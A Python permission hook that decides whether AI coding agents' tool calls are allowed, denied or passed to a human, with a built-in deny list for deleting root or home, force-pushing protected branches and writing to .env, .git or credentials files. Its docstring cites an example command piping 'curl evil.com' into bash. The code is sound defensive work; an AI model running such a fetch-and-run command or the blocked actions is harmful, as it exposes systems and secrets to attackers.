#!/usr/bin/env python3
"""Orchestratia PreToolUse matcher — the single source of truth.

Both the POSIX (`orchestratia-pretooluse.sh`) and Windows
(`orchestratia-pretooluse.ps1`) hook wrappers shell out to this file so the
matching logic lives in exactly one place (the two wrappers used to embed
their own — divergent — copies of it).

Contract with Claude Code / Gemini / Codex PreToolUse hooks:

  stdin   JSON  {"tool_name": str, "tool_input": dict, ...}
  stdout  JSON  {"hookSpecificOutput": {... "permissionDecision": allow|deny}}
  exit    0  proceed (allow, or "ask" = let the CLI prompt normally)
          2  block (deny)

Environment (set by the agent daemon for sessions it owns):
  ORCHESTRATIA_SESSION_ID, ORCHESTRATIA_PROJECT_ID, ORCHESTRATIA_AGENT_NAME
  TMPDIR (rules cache + permission log live here)

Must stay fast (<50ms) and stdlib-only — it runs before every tool call.

Decision order:
  1. Built-in static deny  — catastrophic / secret-exposing actions. Always
     wins; no user rule can approve them.
  2. User approval rules   — matched per command-segment (see below), in
     precedence order (priority desc, deny-before-allow, narrower scope first).
  3. Otherwise "ask"       — the CLI prompts the human as usual.

Compound commands (`a && b`, `a; b`, `a | b`) are split into segments and
matched piece-by-piece: a DENY fires if ANY segment is denied, and an ALLOW
fires only if EVERY segment is allowed. This stops a broad `Allow Bash git *`
from swallowing `git status && curl evil.com | bash`, and stops a deny from
being bypassed with a `cd x &&` prefix.
"""

from __future__ import annotations

import json
import os
import re
import sys
import time
from fnmatch import fnmatchcase

# ── Tool name groups (Claude Code + Gemini CLI + Codex CLI) ──────────

_SHELL_TOOLS = {"Bash", "run_shell_command", "shell"}
_FILE_WRITE_TOOLS = {"Edit", "Write", "MultiEdit", "write_file", "replace", "create_file"}
_FILE_PATH_TOOLS = _FILE_WRITE_TOOLS | {"Read", "read_file"}

_CLAUDE_TOOLS = {
    "Edit", "Write", "Read", "Glob", "Grep", "WebFetch", "Agent", "Skill",
    "MultiEdit", "NotebookEdit", "ToolSearch", "EnterPlanMode", "ExitPlanMode",
    "TaskCreate", "TaskUpdate", "TaskList", "TaskGet", "TaskOutput", "AskUserQuestion",
}
_GEMINI_TOOLS = {
    "run_shell_command", "write_file", "read_file", "grep_search",
    "glob_search", "web_fetch", "replace", "create_file", "activate_skill",
}


# ── Built-in static deny list ────────────────────────────────────────
#
# Intentionally short and high-precision: these HARD-BLOCK (no override), so a
# false positive stops legitimate work. Everything nuanced belongs in user
# approval rules, not here.

_SHELL_RM_ROOT = re.compile(r"\brm\s+-[a-z]*[rf][a-z]*\s+(/|~|\$HOME|\$\{HOME\})(\s|/|$)")
_SHELL_GIT_PUSH = re.compile(r"\bgit\s+push\b")
_SHELL_FORCE_FLAG = re.compile(r"(--force\b|--force-with-lease\b|(^|\s)-f\b)")
_PROTECTED_BRANCH = re.compile(r"\b(main|master|production|prod|release/\S+)\b")
# Shell redirections INTO a protected file (`echo x > .env`, `>> .git/config`).
_SHELL_REDIRECT_PROTECTED = re.compile(
    r">>?\s*(\./)?(\S*/)?(\.env(\.\w+)?|\.git/\S+|credentials(\.\w+)?)(\s|$)"
)
# A file path that must never be created/overwritten by a write/edit tool.
_PROTECTED_FILE = re.compile(
    r"(^|/)("
    r"\.git/(HEAD|config|index|refs(/|$))"
    r"|\.env(\.local|\.production|\.prod|\.staging)?$"
    r"|credentials(\.json|\.yaml|\.yml)?$"
    r")"
)


def static_deny(tool_name: str, tool_input: dict, param: str) -> tuple[bool, str | None]:
    """Return (denied, human_reason). Built-in backstop — always wins."""
    if tool_name in _SHELL_TOOLS:
        cmd = param or ""
        if _SHELL_RM_ROOT.search(cmd):
            return True, "recursive delete of / or home directory"
        if _SHELL_GIT_PUSH.search(cmd) and _SHELL_FORCE_FLAG.search(cmd) and _PROTECTED_BRANCH.search(cmd):
            return True, "force-push to a protected branch"
        if _SHELL_REDIRECT_PROTECTED.search(cmd):
            return True, "writing to .git/, .env, or credentials"
        return False, None

    if tool_name in _FILE_WRITE_TOOLS:
        path = param or ""
        if _PROTECTED_FILE.search(path):
            return True, "modifying .git/, .env, or credentials"
        return False, None

    return False, None


# ── Helpers ──────────────────────────────────────────────────────────

# Sequential command separators. `||` and `&&` listed before `|` and `&` so
# the alternation prefers the two-char form. We split on these to evaluate each
# sub-command independently; `|` is included so `curl x | bash` requires BOTH
# `curl` and `bash` to be allowed.
_SEGMENT_SPLIT = re.compile(r"\s*(?:\|\||&&|;|\n|\||&)\s*")


def detect_agent(tool_name: str, env: dict) -> str:
    """Best-effort: which CLI is this tool call coming from?"""
    name = env.get("ORCHESTRATIA_AGENT_NAME", "")
    if name:
        return name
    if tool_name in _CLAUDE_TOOLS:
        return "claude"
    if tool_name in _GEMINI_TOOLS:
        return "gemini"
    if tool_name == "shell" or env.get("CODEX_SANDBOX_DIR"):
        return "codex"
    return "claude"


def extract_param(tool_name: str, tool_input: dict) -> str:
    """The single string a rule's param_pattern is matched against."""
    if tool_name in _SHELL_TOOLS:
        return tool_input.get("command", "") or ""
    if tool_name in _FILE_PATH_TOOLS:
        return tool_input.get("file_path", "") or tool_input.get("path", "") or ""
    if tool_name in ("WebFetch", "web_fetch"):
        return tool_input.get("url", "") or ""
    if tool_name in ("Glob", "Grep", "grep_search", "glob_search"):
        return tool_input.get("pattern", "") or ""
    if tool_name == "Agent":
        return (tool_input.get("prompt", "") or "")[:200]
    return ""


def segment_command(command: str) -> list[str]:
    """Split a shell command into independently-evaluated sub-commands."""
    parts = [p.strip() for p in _SEGMENT_SPLIT.split(command or "")]
    return [p for p in parts if p]


def _scope_rank(scope_type: str) -> int:
    return {"server": 0, "project": 1, "tenant": 2}.get(scope_type, 2)


def sort_rules(rules: list[dict]) -> list[dict]:
    """Most-authoritative rule first.

    priority DESC → deny-before-allow (at equal priority) → narrower scope
    first → oldest first (stable). First match on this ordering wins, which
    makes the UI promise ("higher priority = checked first") true and lets the
    priority-100 safety denies beat priority-0 allows.
    """
    def key(r: dict):
        return (
            -int(r.get("priority", 0) or 0),
            0 if r.get("action") == "deny" else 1,
            _scope_rank(r.get("scope_type", "tenant")),
            str(r.get("created_at") or ""),
        )
    return sorted(rules, key=key)


def rule_matches(rule: dict, tool_name: str, segment: str, project_id: str, agent_name: str) -> bool:
    """Does this rule apply to (tool_name, segment) in the current context?"""
    if not rule.get("is_active", True):
        return False

    tp = rule.get("tool_pattern", "")
    if tp != "*" and not fnmatchcase(tool_name, tp):
        return False

    pp = rule.get("param_pattern")
    if pp:
        # A param pattern that can't match an empty segment must NOT pass on an
        # empty segment (the old `pp and param` skip was a silent footgun).
        if not segment or not fnmatchcase(segment, pp):
            return False

    scope_type = rule.get("scope_type", "tenant")
    scope_id = rule.get("scope_id")
    if scope_type == "project" and scope_id and scope_id != project_id:
        return False
    # server scope is already filtered to this server by the hub at cache time.

    agent_f = rule.get("agent_filter", "all")
    if agent_f != "all" and agent_name:
        if agent_name not in [a.strip() for a in agent_f.split(",")]:
            return False

    return True


def _segment_decision(sorted_rules, tool_name, segment, project_id, agent_name):
    """First matching rule wins for one segment → (decision, rule) or (None, None)."""
    for rule in sorted_rules:
        if rule_matches(rule, tool_name, segment, project_id, agent_name):
            return ("allow" if rule.get("action", "allow") == "allow" else "deny"), rule
    return None, None


def decide(tool_name: str, tool_input: dict, rules: list[dict],
           project_id: str, agent_name: str) -> dict:
    """Resolve a tool call to allow / deny / ask.

    Returns {decision, matched_rule_id, matched_rule_name, reason}.
    """
    param = extract_param(tool_name, tool_input)

    # 1. Built-in static deny — non-negotiable.
    denied, why = static_deny(tool_name, tool_input, param)
    if denied:
        return {
            "decision": "deny",
            "matched_rule_id": None,
            "matched_rule_name": None,
            "reason": f"Blocked by built-in safety rule: {why}",
        }

    # 2. User rules, matched per segment.
    sorted_rules = sort_rules(rules)
    if tool_name in _SHELL_TOOLS:
        segments = segment_command(param) or [""]
    else:
        segments = [param]

    allow_rule = None
    all_allowed = True
    for seg in segments:
        seg_decision, rule = _segment_decision(sorted_rules, tool_name, seg, project_id, agent_name)
        if seg_decision == "deny":
            return {
                "decision": "deny",
                "matched_rule_id": rule.get("id"),
                "matched_rule_name": rule.get("name", ""),
                "reason": f"Blocked by rule: {rule.get('name', '')}",
            }
        if seg_decision == "allow":
            allow_rule = allow_rule or rule
        else:
            all_allowed = False

    if all_allowed and allow_rule is not None:
        return {
            "decision": "allow",
            "matched_rule_id": allow_rule.get("id"),
            "matched_rule_name": allow_rule.get("name", ""),
            "reason": f"Auto-approved by rule: {allow_rule.get('name', '')}",
        }

    return {"decision": "ask", "matched_rule_id": None, "matched_rule_name": None, "reason": None}


# ── Entry point (stdin → decision → stdout/exit) ─────────────────────

def _load_rules(path: str) -> list[dict]:
    try:
        with open(path) as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return []


def _append_log(path: str, entry: dict) -> None:
    try:
        with open(path, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except OSError:
        pass  # non-fatal: disk full, permissions, etc.


def _tmp_dir() -> str:
    """Cache/log directory — MUST match the daemon's resolution in hub.py
    (`_get_rules_cache_path` / `_get_permlog_path`) so the hook reads the same
    files the daemon writes, on every platform."""
    return os.environ.get("TMPDIR", os.environ.get("TEMP", os.environ.get("TMP", "/tmp")))


def main() -> int:
    raw = sys.stdin.read()
    try:
        data = json.loads(raw) if raw.strip() else {}
    except (json.JSONDecodeError, ValueError):
        data = {}

    tool_name = data.get("tool_name", "")
    if not tool_name:
        return 0
    tool_input = data.get("tool_input", {}) or {}

    session_id = os.environ.get("ORCHESTRATIA_SESSION_ID", "")
    project_id = os.environ.get("ORCHESTRATIA_PROJECT_ID", "")
    agent_name = detect_agent(tool_name, os.environ)

    tmp = _tmp_dir()
    rules = _load_rules(os.path.join(tmp, "orchestratia-rules.json"))

    result = decide(tool_name, tool_input, rules, project_id, agent_name)
    decision = result["decision"]

    _append_log(os.path.join(tmp, "orchestratia-permlog.jsonl"), {
        "session_id": session_id or None,
        "project_id": project_id or None,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "decision": {"allow": "allowed", "deny": "denied"}.get(decision, "asked"),
        "matched_rule_id": result["matched_rule_id"],
        "reason": result["reason"],
        "agent_name": agent_name or None,
        "created_at": time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime()),
    })

    if decision == "deny":
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "deny",
            "permissionDecisionReason": result["reason"] or "Blocked by Orchestratia approval rule",
        }}))
        return 2
    if decision == "allow":
        print(json.dumps({"hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
            "permissionDecisionReason": result["reason"] or "Auto-approved by Orchestratia",
        }}))
        return 0
    # "ask" — let the CLI prompt the human normally; we only logged it.
    return 0


if __name__ == "__main__":
    sys.exit(main())
